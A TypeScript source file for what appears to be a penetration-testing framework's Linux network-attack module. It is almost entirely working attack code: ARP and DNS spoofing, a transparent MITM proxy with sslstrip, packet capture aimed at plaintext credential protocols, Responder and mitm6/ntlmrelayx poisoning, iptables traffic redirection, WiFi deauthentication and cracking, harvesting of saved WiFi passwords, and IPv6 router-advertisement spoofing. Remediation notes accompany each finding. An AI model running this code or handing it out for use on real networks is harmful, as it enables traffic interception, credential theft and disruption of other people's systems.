import { bash, sh, python3, activeExec, argVal, hasFlag } from "./shared"
import type { Finding, HookResult } from "./shared"

export async function arpSpoof(args: string[], timeout: number): Promise<HookResult> {
  const findings: Finding[] = []
  const output: string[] = ["=== ARP Spoofing ==="]

  const target = argVal(args, "--target")
  const gateway = argVal(args, "--gateway")
  const iface = argVal(args, "--interface") || "eth0"

  if (!target || !gateway) {
    output.push("Usage: linuxhook arp_spoof --target <victim-ip> --gateway <gateway-ip> [--interface eth0]")
    output.push("Positions attacker as MITM between target and gateway via ARP cache poisoning")
    return { output: output.join("\n"), findings }
  }

  const script = `
echo "[*] Target: ${target}"
echo "[*] Gateway: ${gateway}"
echo "[*] Interface: ${iface}"
echo ""

echo "--- Enabling IP Forwarding ---"
CURRENT=$(cat /proc/sys/net/ipv4/ip_forward 2>/dev/null)
echo "[*] Current ip_forward: $CURRENT"
echo 1 > /proc/sys/net/ipv4/ip_forward 2>/dev/null && echo "[+] IP forwarding enabled" || echo "[-] Cannot enable (need root)"

echo ""
echo "--- ARP Spoofing Methods ---"

if command -v arpspoof >/dev/null 2>&1; then
  echo "[+] arpspoof (dsniff) available"
  echo "[*] Command: arpspoof -i ${iface} -t ${target} ${gateway} &"
  echo "[*] Reverse:  arpspoof -i ${iface} -t ${gateway} ${target} &"
elif command -v python3 >/dev/null 2>&1; then
  echo "[*] Using python3 scapy-style ARP"
  echo "[*] Command:"
  echo "    python3 -c \\"import scapy.all as s; s.send(s.ARP(op=2,pdst='${target}',hwdst='ff:ff:ff:ff:ff:ff',psrc='${gateway}'),loop=1,inter=2)\\""
else
  echo "[*] Manual ARP with arping:"
  echo "    while true; do arping -U -I ${iface} -s ${gateway} ${target} -c 1; sleep 2; done"
fi

echo ""
echo "--- Current ARP Table ---"
ip neigh show 2>/dev/null || arp -a 2>/dev/null

echo ""
echo "--- Interface MAC ---"
ip link show ${iface} 2>/dev/null | grep ether || ifconfig ${iface} 2>/dev/null | grep ether
`

  const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
  output.push(r.stdout || r.stderr)

  findings.push({
    checkId: "LNX-ARP-001",
    provider: "linuxhook",
    severity: "HIGH",
    status: "READY",
    resource: `${target} <-> ${gateway}`,
    title: "ARP spoofing attack prepared",
    details: `ARP spoof setup for MITM between ${target} and ${gateway} on ${iface}`,
    remediation:
      "Implement Dynamic ARP Inspection (DAI). Use static ARP entries for critical infrastructure. Enable ARP spoofing detection.",
  })

  return { output: output.join("\n"), findings }
}

export async function dnsSpoof(args: string[], timeout: number): Promise<HookResult> {
  const findings: Finding[] = []
  const output: string[] = ["=== DNS Spoofing ==="]

  const domain = argVal(args, "--domain")
  const ip = argVal(args, "--ip")

  if (!domain || !ip) {
    output.push("Usage: linuxhook dns_spoof --domain target.com --ip <attacker-ip>")
    return { output: output.join("\n"), findings }
  }

  const script = `
echo "[*] Domain: ${domain}"
echo "[*] Redirect to: ${ip}"
echo ""

echo "--- Method 1: /etc/hosts ---"
if [ -w /etc/hosts ]; then
  echo "[+] /etc/hosts is writable"
  if grep -q "${domain}" /etc/hosts 2>/dev/null; then
    echo "[*] Entry already exists:"
    grep "${domain}" /etc/hosts
  else
    echo "[*] Command: echo '${ip} ${domain}' >> /etc/hosts"
  fi
else
  echo "[-] /etc/hosts not writable (need root)"
fi

echo ""
echo "--- Method 2: dnsmasq ---"
if command -v dnsmasq >/dev/null 2>&1; then
  echo "[+] dnsmasq available"
  echo "[*] Command: dnsmasq --address=/${domain}/${ip} --no-daemon"
else
  echo "[-] dnsmasq not installed"
fi

echo ""
echo "--- Method 3: iptables DNS redirect ---"
echo "[*] Redirect DNS traffic to local responder:"
echo "    iptables -t nat -A PREROUTING -p udp --dport 53 -j REDIRECT --to-port 5353"
echo "    python3 dns_responder.py --domain ${domain} --ip ${ip} --port 5353"

echo ""
echo "--- Current DNS Config ---"
cat /etc/resolv.conf 2>/dev/null | grep -v "^#"
`

  const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
  output.push(r.stdout || r.stderr)

  findings.push({
    checkId: "LNX-DNSSPOOF-001",
    provider: "linuxhook",
    severity: "HIGH",
    status: "READY",
    resource: domain,
    title: "DNS spoofing attack prepared",
    details: `DNS spoofing setup to redirect ${domain} to ${ip}`,
    remediation: "Use DNSSEC. Monitor /etc/hosts for unauthorized changes. Use DNS over HTTPS/TLS.",
  })

  return { output: output.join("\n"), findings }
}

export async function packetCapture(args: string[], timeout: number): Promise<HookResult> {
  const findings: Finding[] = []
  const output: string[] = ["=== Packet Capture ==="]

  const iface = argVal(args, "--interface") || "any"
  const duration = argVal(args, "--duration") || "30"
  const outFile = argVal(args, "--output") || "/dev/shm/cs_capture.pcap"

  const script = `
echo "[*] Interface: ${iface}"
echo "[*] Duration: ${duration}s"
echo "[*] Output: ${outFile}"
echo ""

BPF="(port 21 or port 23 or port 25 or port 80 or port 110 or port 143 or port 389 or port 445 or port 3306 or port 5432)"
echo "[*] BPF Filter: $BPF"
echo ""

if command -v tcpdump >/dev/null 2>&1; then
  echo "[*] Using tcpdump"
  timeout ${duration} tcpdump -i ${iface} -w "${outFile}" "$BPF" -c 10000 2>&1 &
  TCPID=$!
  echo "[+] tcpdump started (PID: $TCPID)"
  echo "[*] Waiting ${duration}s..."
  wait $TCPID 2>/dev/null
  if [ -f "${outFile}" ]; then
    SIZE=$(wc -c < "${outFile}" 2>/dev/null)
    echo "[+] Capture saved: ${outFile} ($SIZE bytes)"
    echo ""
    echo "--- Quick Analysis ---"
    tcpdump -r "${outFile}" -n 2>/dev/null | head -20
  fi
elif command -v tshark >/dev/null 2>&1; then
  echo "[*] Using tshark"
  timeout ${duration} tshark -i ${iface} -w "${outFile}" -f "$BPF" -c 10000 2>&1 &
  TSPID=$!
  echo "[+] tshark started (PID: $TSPID)"
  wait $TSPID 2>/dev/null
  [ -f "${outFile}" ] && echo "[+] Capture saved: ${outFile}" || echo "[-] Capture failed"
else
  echo "[-] No packet capture tool found (tcpdump or tshark required)"
  echo ""
  echo "[*] Alternative: raw socket capture with python3"
  echo "    python3 -c 'import socket; s=socket.socket(socket.AF_PACKET,socket.SOCK_RAW,socket.ntohs(3)); ...'"
fi
`

  const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
  output.push(r.stdout || r.stderr)

  if (r.stdout.includes("Capture saved")) {
    findings.push({
      checkId: "LNX-PCAP-001",
      provider: "linuxhook",
      severity: "HIGH",
      status: "CAPTURED",
      resource: outFile,
      title: "Network traffic captured",
      details: `Packet capture saved to ${outFile}. Filtered for credential-bearing protocols (FTP, Telnet, HTTP, SMTP, LDAP, SMB, MySQL, PostgreSQL).`,
      remediation:
        "Encrypt all network traffic (TLS/SSH). Disable plaintext protocols. Implement network segmentation.",
    })
  }

  return { output: output.join("\n"), findings }
}

export async function portScanNative(args: string[], timeout: number): Promise<HookResult> {
  const findings: Finding[] = []
  const output: string[] = ["=== Port Scan ==="]

  const target = argVal(args, "--target") || "127.0.0.1"
  const ports =
    argVal(args, "--ports") ||
    "21,22,23,25,53,80,110,111,135,139,143,443,445,993,995,1433,1521,3306,3389,5432,5900,6379,8080,8443,9200,27017"

  const script = `
echo "[*] Target: ${target}"
echo "[*] Ports: ${ports}"
echo ""

if command -v nmap >/dev/null 2>&1; then
  echo "[*] Using nmap"
  nmap -sT -sV --top-ports 100 -T4 ${target} 2>/dev/null | grep -E "^(PORT|[0-9])" | head -50
elif command -v nc >/dev/null 2>&1 || command -v ncat >/dev/null 2>&1; then
  NC=$(command -v ncat 2>/dev/null || command -v nc 2>/dev/null)
  echo "[*] Using $NC"
  IFS=',' read -ra PORTS <<< "${ports}"
  for p in "\${PORTS[@]}"; do
    result=$($NC -zv -w 2 ${target} $p 2>&1)
    if echo "$result" | grep -qi "open\|succeed\|connected"; then
      echo "[+] ${target}:$p OPEN"
    fi
  done
else
  echo "[*] Using bash /dev/tcp (slowest but always available)"
  IFS=',' read -ra PORTS <<< "${ports}"
  for p in "\${PORTS[@]}"; do
    (echo >/dev/tcp/${target}/$p) 2>/dev/null && echo "[+] ${target}:$p OPEN" &
  done
  wait
fi
`

  const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
  output.push(r.stdout || r.stderr)

  const openPorts = (r.stdout.match(/OPEN/g) || []).length
  if (openPorts > 0) {
    findings.push({
      checkId: "LNX-PORTSCAN-001",
      provider: "linuxhook",
      severity: "INFO",
      status: "IDENTIFIED",
      resource: target,
      title: `${openPorts} open port(s) found on ${target}`,
      details: `Port scan of ${target} found ${openPorts} open port(s) — review for lateral movement and service exploitation opportunities`,
      remediation: "Close unnecessary ports. Implement host-based firewalls. Use network segmentation.",
    })
  }

  return { output: output.join("\n"), findings }
}

export async function mitmProxy(args: string[], timeout: number): Promise<HookResult> {
  const findings: Finding[] = []
  const output: string[] = ["=== MITM Proxy Setup ==="]

  const iface = argVal(args, "--interface") || "eth0"
  const targetPort = argVal(args, "--target-port") || "80"

  const script = `
echo "[*] Interface: ${iface}"
echo "[*] Target port: ${targetPort}"
echo ""

echo "--- Step 1: Enable IP Forwarding ---"
echo 1 > /proc/sys/net/ipv4/ip_forward 2>/dev/null && echo "[+] IP forwarding enabled" || echo "[-] Cannot enable (need root)"

echo ""
echo "--- Step 2: iptables Transparent Redirect ---"
echo "[*] Commands to run:"
echo "    iptables -t nat -A PREROUTING -i ${iface} -p tcp --dport ${targetPort} -j REDIRECT --to-port 8080"
echo "    iptables -t nat -A PREROUTING -i ${iface} -p tcp --dport 443 -j REDIRECT --to-port 8443"

echo ""
echo "--- Step 3: Proxy Tool ---"
if command -v mitmproxy >/dev/null 2>&1; then
  echo "[+] mitmproxy available"
  echo "[*] Command: mitmproxy --mode transparent --listen-port 8080"
elif command -v sslstrip >/dev/null 2>&1; then
  echo "[+] sslstrip available"
  echo "[*] Command: sslstrip -l 8080 -a"
elif command -v python3 >/dev/null 2>&1; then
  echo "[*] python3 available — can create simple HTTP proxy"
  echo "[*] Or install: pip3 install mitmproxy"
else
  echo "[-] No proxy tool found"
fi

echo ""
echo "--- Cleanup Commands ---"
echo "    iptables -t nat -D PREROUTING -i ${iface} -p tcp --dport ${targetPort} -j REDIRECT --to-port 8080"
echo "    echo 0 > /proc/sys/net/ipv4/ip_forward"
`

  const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
  output.push(r.stdout || r.stderr)

  findings.push({
    checkId: "LNX-MITM-001",
    provider: "linuxhook",
    severity: "HIGH",
    status: "READY",
    resource: iface,
    title: "MITM proxy setup prepared",
    details: `Transparent MITM proxy instructions for ${iface}, intercepting port ${targetPort} traffic`,
    remediation: "Use HTTPS everywhere. Implement HSTS. Monitor for ARP spoofing and iptables changes.",
  })

  return { output: output.join("\n"), findings }
}

export async function responderLinux(args: string[], timeout: number): Promise<HookResult> {
  const findings: Finding[] = []
  const output: string[] = ["=== LLMNR/NBT-NS/mDNS Poisoning ==="]

  const iface = argVal(args, "--interface") || "eth0"

  const script = `
echo "[*] Interface: ${iface}"
echo ""

echo "--- Checking Responder ---"
if command -v responder >/dev/null 2>&1 || [ -f /opt/Responder/Responder.py ] || [ -f /usr/share/responder/Responder.py ]; then
  RESPONDER=$(command -v responder 2>/dev/null || echo "python3 /opt/Responder/Responder.py" 2>/dev/null)
  [ -f /usr/share/responder/Responder.py ] && RESPONDER="python3 /usr/share/responder/Responder.py"
  echo "[+] Responder found: $RESPONDER"
  echo "[*] Command: $RESPONDER -I ${iface} -wrf"
  echo "[*] Analyze: $RESPONDER -I ${iface} -A (analysis mode, no poisoning)"
else
  echo "[-] Responder not found"
  echo "[*] Install: git clone https://github.com/lgandx/Responder /opt/Responder"
  echo ""
  echo "[*] Alternative: Manual LLMNR listener with python3"
fi

echo ""
echo "--- Multicast Group Check ---"
ip maddr show ${iface} 2>/dev/null | grep -iE "224.0.0.252|ff02::1:3|224.0.0.251" || echo "[-] No LLMNR/mDNS multicast groups joined"

echo ""
echo "--- Protocol Status ---"
echo "LLMNR (port 5355):"
ss -ulnp 2>/dev/null | grep 5355 || echo "  Not listening"
echo "mDNS (port 5353):"
ss -ulnp 2>/dev/null | grep 5353 || echo "  Not listening"
echo "NBT-NS (port 137):"
ss -ulnp 2>/dev/null | grep 137 || echo "  Not listening"

echo ""
echo "--- Existing Hashes ---"
if [ -d /opt/Responder/logs ]; then
  echo "[*] Previous captures:"
  ls -la /opt/Responder/logs/*.txt 2>/dev/null | head -10
  echo ""
  grep -h "NTLMv2" /opt/Responder/logs/*.txt 2>/dev/null | head -5
fi
`

  const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
  output.push(r.stdout || r.stderr)

  findings.push({
    checkId: "LNX-RESPONDER-001",
    provider: "linuxhook",
    severity: "HIGH",
    status: r.stdout.includes("[+] Responder found") ? "READY" : "TOOL_MISSING",
    resource: iface,
    title: "LLMNR/NBT-NS/mDNS poisoning setup",
    details: `Poisoning attack setup for ${iface}. ${r.stdout.includes("[+] Responder found") ? "Responder is available." : "Responder not installed — manual setup required."}`,
    remediation:
      "Disable LLMNR and NBT-NS via Group Policy. Disable mDNS if not required. Use DNS for name resolution.",
  })

  return { output: output.join("\n"), findings }
}

export async function firewallEnum(args: string[], timeout: number): Promise<HookResult> {
  const findings: Finding[] = []
  const output: string[] = ["=== Firewall Enumeration ==="]

  const script = `
echo "--- iptables ---"
if command -v iptables >/dev/null 2>&1; then
  echo "[*] Filter table:"
  iptables -L -n -v 2>/dev/null || echo "[-] Cannot read (need root)"
  echo ""
  echo "[*] NAT table:"
  iptables -t nat -L -n -v 2>/dev/null || echo "[-] Cannot read"
  echo ""
  echo "[*] Raw table:"
  iptables -t raw -L -n 2>/dev/null || echo "[-] Cannot read"
else
  echo "[-] iptables not found"
fi

echo ""
echo "--- nftables ---"
if command -v nft >/dev/null 2>&1; then
  echo "[*] nft ruleset:"
  nft list ruleset 2>/dev/null | head -50 || echo "[-] Cannot read (need root)"
else
  echo "[-] nft not found"
fi

echo ""
echo "--- ufw ---"
if command -v ufw >/dev/null 2>&1; then
  echo "[*] ufw status:"
  ufw status verbose 2>/dev/null || echo "[-] Cannot read"
else
  echo "[-] ufw not found"
fi

echo ""
echo "--- firewalld ---"
if command -v firewall-cmd >/dev/null 2>&1; then
  echo "[*] firewalld zones:"
  firewall-cmd --list-all 2>/dev/null || echo "[-] Cannot read"
else
  echo "[-] firewalld not found"
fi
`

  const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
  output.push(r.stdout || r.stderr)

  const hasAccept = r.stdout.includes("ACCEPT") || r.stdout.includes("allow")
  const allOpen = r.stdout.includes("policy ACCEPT") || r.stdout.includes("Status: inactive")

  if (allOpen) {
    findings.push({
      checkId: "LNX-FW-001",
      provider: "linuxhook",
      severity: "HIGH",
      status: "VULNERABLE",
      resource: "firewall",
      title: "Firewall is permissive or inactive",
      details: "Default ACCEPT policy or firewall inactive — all traffic allowed",
      remediation: "Enable firewall with default DROP policy. Allow only required ports.",
    })
  } else {
    findings.push({
      checkId: "LNX-FW-002",
      provider: "linuxhook",
      severity: "INFO",
      status: "IDENTIFIED",
      resource: "firewall",
      title: "Firewall rules enumerated",
      details: "Firewall rules collected — review for overly permissive rules and bypass opportunities",
      remediation: "Review and tighten firewall rules. Implement egress filtering.",
    })
  }

  return { output: output.join("\n"), findings }
}

export async function trafficRedirect(args: string[], timeout: number): Promise<HookResult> {
  const findings: Finding[] = []
  const output: string[] = ["=== Traffic Redirect ==="]

  const fromPort = argVal(args, "--from-port")
  const toPort = argVal(args, "--to-port")
  const targetIp = argVal(args, "--target-ip")

  if (!fromPort || !toPort) {
    output.push("Usage: linuxhook traffic_redirect --from-port 80 --to-port 8080 [--target-ip <remote-ip>]")
    output.push("Redirect traffic using iptables REDIRECT (local) or DNAT (remote)")
    return { output: output.join("\n"), findings }
  }

  const script = `
echo "[*] Redirect: port ${fromPort} -> ${targetIp ? targetIp + ":" : ""}${toPort}"
echo ""

echo "--- Enabling IP Forwarding ---"
echo 1 > /proc/sys/net/ipv4/ip_forward 2>/dev/null && echo "[+] IP forwarding enabled" || echo "[-] Cannot enable (need root)"

echo ""
${
  targetIp
    ? `
echo "--- DNAT Rule (remote redirect) ---"
echo "[*] iptables -t nat -A PREROUTING -p tcp --dport ${fromPort} -j DNAT --to-destination ${targetIp}:${toPort}"
echo "[*] iptables -t nat -A POSTROUTING -j MASQUERADE"
iptables -t nat -A PREROUTING -p tcp --dport ${fromPort} -j DNAT --to-destination ${targetIp}:${toPort} 2>/dev/null && echo "[+] DNAT rule added" || echo "[-] Failed (need root)"
iptables -t nat -A POSTROUTING -j MASQUERADE 2>/dev/null
echo ""
echo "--- Cleanup ---"
echo "    iptables -t nat -D PREROUTING -p tcp --dport ${fromPort} -j DNAT --to-destination ${targetIp}:${toPort}"
`
    : `
echo "--- REDIRECT Rule (local redirect) ---"
echo "[*] iptables -t nat -A PREROUTING -p tcp --dport ${fromPort} -j REDIRECT --to-port ${toPort}"
iptables -t nat -A PREROUTING -p tcp --dport ${fromPort} -j REDIRECT --to-port ${toPort} 2>/dev/null && echo "[+] REDIRECT rule added" || echo "[-] Failed (need root)"
echo ""
echo "--- Cleanup ---"
echo "    iptables -t nat -D PREROUTING -p tcp --dport ${fromPort} -j REDIRECT --to-port ${toPort}"
`
}

echo ""
echo "--- Current NAT Rules ---"
iptables -t nat -L -n 2>/dev/null | head -20
`

  const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
  output.push(r.stdout || r.stderr)

  findings.push({
    checkId: "LNX-REDIRECT-001",
    provider: "linuxhook",
    severity: "HIGH",
    status: r.stdout.includes("[+]") ? "ACTIVE" : "READY",
    resource: `port ${fromPort}`,
    title: `Traffic redirect ${fromPort} -> ${targetIp ? targetIp + ":" : ""}${toPort}`,
    details: `iptables ${targetIp ? "DNAT" : "REDIRECT"} rule ${r.stdout.includes("[+]") ? "active" : "prepared"} for port ${fromPort}`,
    remediation:
      "Monitor iptables NAT rules for unauthorized changes. Implement change monitoring on firewall configs.",
  })

  return { output: output.join("\n"), findings }
}

export async function wifiAttack(args: string[], timeout: number): Promise<HookResult> {
  const findings: Finding[] = []
  const output: string[] = ["=== WiFi Attack ==="]

  const iface = argVal(args, "--interface") || "wlan0"
  const targetBssid = argVal(args, "--target-bssid")

  const script = `
echo "[*] Interface: ${iface}"
echo ""

echo "--- Wireless Interfaces ---"
iw dev 2>/dev/null || iwconfig 2>/dev/null || echo "[-] No wireless tools found"

echo ""
echo "--- Available Networks ---"
iw dev ${iface} scan 2>/dev/null | grep -E "^BSS|SSID:|signal:|capability:" | head -40 || \
  iwlist ${iface} scan 2>/dev/null | grep -E "Cell|ESSID|Signal|Encryption" | head -40 || \
  echo "[-] Cannot scan (need root or monitor mode)"

echo ""
echo "--- Monitor Mode ---"
if command -v airmon-ng >/dev/null 2>&1; then
  echo "[+] airmon-ng available"
  echo "[*] Enable:  airmon-ng start ${iface}"
  echo "[*] Scan:    airodump-ng ${iface}mon"
  ${targetBssid ? `echo "[*] Deauth:  aireplay-ng -0 10 -a ${targetBssid} ${iface}mon"` : `echo "[*] Deauth:  aireplay-ng -0 10 -a <BSSID> ${iface}mon"`}
  echo "[*] Capture: airodump-ng -c <CH> --bssid <BSSID> -w /dev/shm/cs_capture ${iface}mon"
  echo "[*] Crack:   aircrack-ng /dev/shm/cs_capture-01.cap -w /usr/share/wordlists/rockyou.txt"
else
  echo "[-] aircrack-ng suite not installed"
  echo "[*] Install: apt install aircrack-ng"
fi

echo ""
echo "--- Saved WiFi Passwords ---"
ls /etc/NetworkManager/system-connections/ 2>/dev/null | head -10
grep -r "psk=" /etc/NetworkManager/system-connections/ 2>/dev/null | head -5
`

  const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
  output.push(r.stdout || r.stderr)

  const hasAircrack = r.stdout.includes("[+] airmon-ng available")
  findings.push({
    checkId: "LNX-WIFIATT-001",
    provider: "linuxhook",
    severity: "HIGH",
    status: hasAircrack ? "READY" : "TOOL_MISSING",
    resource: iface,
    title: "WiFi attack reconnaissance",
    details: `WiFi interface ${iface} scanned. ${hasAircrack ? "aircrack-ng suite available for attacks." : "aircrack-ng not installed."}`,
    remediation: "Use WPA3 where possible. Implement 802.1X enterprise authentication. Disable WPS.",
  })

  return { output: output.join("\n"), findings }
}

export async function ipv6Attack(args: string[], timeout: number): Promise<HookResult> {
  const findings: Finding[] = []
  const output: string[] = ["[*] IPv6 network attacks — RA spoofing, DHCPv6 poisoning, SLAAC abuse\n"]

  const action = argVal(args, "--action") || "scan"
  const iface = argVal(args, "--interface") || "eth0"
  const target = argVal(args, "--target")
  const domain = argVal(args, "--domain")

  const exec = activeExec === "sh" ? sh : bash

  const ipv6Check = await exec(`ip -6 addr show dev ${iface} 2>/dev/null || ifconfig ${iface} 2>/dev/null | grep inet6`, timeout)
  if (ipv6Check.stdout.trim()) {
    output.push("[+] IPv6 addresses on interface:")
    output.push(ipv6Check.stdout.trim())
    output.push("")
  }

  const neighborDisc = await exec(`ip -6 neigh show dev ${iface} 2>/dev/null || ndp -an 2>/dev/null`, timeout)
  if (neighborDisc.stdout.trim()) {
    const neighbors = neighborDisc.stdout.trim().split("\n").filter(Boolean)
    output.push(`[+] IPv6 neighbors discovered: ${neighbors.length}`)
    for (const n of neighbors) output.push(`    ${n}`)
    output.push("")

    if (neighbors.length > 0) {
      findings.push({
        checkId: "LNX-NET-IPV6-NEIGH",
        provider: "linuxhook",
        severity: "MEDIUM",
        status: "FOUND",
        resource: iface,
        title: `${neighbors.length} IPv6 neighbors discovered`,
        details: `IPv6 neighbor discovery on ${iface} found ${neighbors.length} hosts. These are potential targets for RA spoofing and DHCPv6 attacks.`,
        remediation: "Implement RA Guard (IEEE 802.1Dj). Enable DHCPv6 Guard on switches. Use SEcure Neighbor Discovery (SEND).",
      })
    }
  }

  const routerDisc = await exec(`rdisc6 ${iface} 2>/dev/null || ndisc6 -1 ff02::2%${iface} 2>/dev/null`, timeout)
  if (routerDisc.stdout.trim()) {
    output.push("[+] IPv6 routers discovered:")
    output.push(routerDisc.stdout.trim())
    output.push("")
  }

  if (action === "scan") {
    const linkLocal = await exec(`ping6 -c 3 -I ${iface} ff02::1 2>/dev/null | grep 'from' | awk '{print $4}' | tr -d ':' | sort -u`, timeout)
    if (linkLocal.stdout.trim()) {
      const hosts = linkLocal.stdout.trim().split("\n").filter(Boolean)
      output.push(`[+] Link-local multicast scan — ${hosts.length} hosts responded:`)
      for (const h of hosts) output.push(`    ${h}`)
      output.push("")
    }

    const multicast = await exec(`ip -6 maddr show dev ${iface} 2>/dev/null`, timeout)
    if (multicast.stdout.trim()) {
      output.push("[+] Multicast groups:")
      output.push(multicast.stdout.trim())
      output.push("")
    }
  }

  if (action === "ra_spoof") {
    const hasFake = await exec("command -v fake_router6 || command -v atk6-fake_router6", timeout)
    const hasScapy = await exec("command -v scapy || python3 -c 'import scapy' 2>/dev/null && echo ok", timeout)
    const hasRaSpoof = hasFake.exitCode === 0
    const hasScapyAvail = hasScapy.exitCode === 0

    if (hasRaSpoof) {
      output.push("[+] fake_router6 available (thc-ipv6 suite)")
      output.push(`    Attack: fake_router6 ${iface} <attacker-ipv6> — inject rogue Router Advertisement`)
      output.push("    Effect: Victims add attacker as default gateway → full MITM on IPv6 traffic")
      output.push("")
    }

    if (hasScapyAvail) {
      output.push("[+] Scapy available — can craft custom RA packets")
      output.push("    Scapy RA template ready")
      output.push("")
    }

    if (!hasRaSpoof && !hasScapyAvail) {
      output.push("[!] No RA spoofing tools found (need thc-ipv6 or scapy)")
      output.push("    Install: apt install thc-ipv6 || pip3 install scapy")
    }

    findings.push({
      checkId: "LNX-NET-IPV6-RA",
      provider: "linuxhook",
      severity: "HIGH",
      status: hasRaSpoof || hasScapyAvail ? "READY" : "TOOL_MISSING",
      resource: iface,
      title: "IPv6 Router Advertisement spoofing",
      details: `RA spoofing on ${iface} can redirect all IPv6 traffic through attacker. ${hasRaSpoof ? "fake_router6 available." : ""} ${hasScapyAvail ? "Scapy available." : ""}`,
      remediation: "Enable RA Guard on all switch ports. Deploy SEND (RFC 3971). Monitor ICMPv6 Type 134 packets.",
    })
  }

  if (action === "dhcpv6") {
    const hasMitm6 = await exec("command -v mitm6", timeout)
    const hasDhcp6 = await exec("command -v dhcp6 || command -v atk6-fake_dhcps6 || command -v fake_dhcps6", timeout)

    if (hasMitm6.exitCode === 0) {
      output.push("[+] mitm6 available — DHCPv6 + DNS spoofing")
      const cmd = domain ? `mitm6 -i ${iface} -d ${domain}` : `mitm6 -i ${iface}`
      output.push(`    Attack: ${cmd}`)
      output.push("    Effect: Poison DHCPv6 → set attacker as DNS server → relay NTLM to LDAP/HTTP")
      output.push("    Pair with: impacket-ntlmrelayx -6 -t ldaps://DC_IP -wh attacker-wpad")
      output.push("")
    }

    if (hasDhcp6.exitCode === 0) {
      output.push("[+] fake_dhcps6 available (thc-ipv6 suite)")
      output.push(`    Attack: fake_dhcps6 ${iface} <attacker-ipv6> <dns-ipv6>`)
      output.push("")
    }

    if (hasMitm6.exitCode !== 0 && hasDhcp6.exitCode !== 0) {
      output.push("[!] No DHCPv6 attack tools found")
      output.push("    Install: pip3 install mitm6 || apt install thc-ipv6")
    }

    findings.push({
      checkId: "LNX-NET-IPV6-DHCP",
      provider: "linuxhook",
      severity: "HIGH",
      status: hasMitm6.exitCode === 0 ? "READY" : "TOOL_MISSING",
      resource: iface,
      title: "DHCPv6 DNS poisoning",
      details: `DHCPv6 spoofing on ${iface} can override DNS server for all IPv6 clients. Windows prefers IPv6 → effective even on IPv4 networks. ${hasMitm6.exitCode === 0 ? "mitm6 available." : ""}`,
      remediation: "Enable DHCPv6 Guard on switches. Block ICMPv6 Type 134 at network edge. Disable IPv6 if not needed.",
    })
  }

  if (action === "slaac") {
    output.push("[*] SLAAC (Stateless Address Autoconfiguration) abuse")
    output.push("    SLAAC allows hosts to auto-configure IPv6 addresses from Router Advertisements")
    output.push("    Attack: Send RA with attacker-controlled prefix → hosts auto-configure on attacker's subnet")
    output.push("")

    const sysctl = await exec("sysctl -a 2>/dev/null | grep 'net.ipv6.conf' | grep -E 'accept_ra|autoconf|forwarding'", timeout)
    if (sysctl.stdout.trim()) {
      output.push("[+] IPv6 sysctl configuration:")
      const lines = sysctl.stdout.trim().split("\n")
      for (const line of lines.slice(0, 20)) output.push(`    ${line}`)
      if (lines.length > 20) output.push(`    ... and ${lines.length - 20} more`)
      output.push("")

      const acceptRa = lines.filter((l) => l.includes("accept_ra") && l.includes("= 1"))
      if (acceptRa.length > 0) {
        findings.push({
          checkId: "LNX-NET-IPV6-SLAAC",
          provider: "linuxhook",
          severity: "MEDIUM",
          status: "VULNERABLE",
          resource: iface,
          title: `${acceptRa.length} interfaces accepting Router Advertisements`,
          details: "Interfaces with accept_ra=1 will auto-configure IPv6 addresses from any RA sender. Attacker can inject rogue prefix to redirect traffic.",
          remediation: "Set net.ipv6.conf.*.accept_ra=0 on server interfaces. Use static IPv6 configuration.",
        })
      }
    }
  }

  if (findings.length === 0) {
    findings.push({
      checkId: "LNX-NET-IPV6-SCAN",
      provider: "linuxhook",
      severity: "LOW",
      status: "INFO",
      resource: iface,
      title: "IPv6 network scan completed",
      details: `IPv6 reconnaissance on ${iface} completed. Use --action ra_spoof|dhcpv6|slaac for active attacks.`,
      remediation: "Review IPv6 security posture. Consider RA Guard, DHCPv6 Guard, and SEND.",
    })
  }

  return { output: output.join("\n"), findings }
}
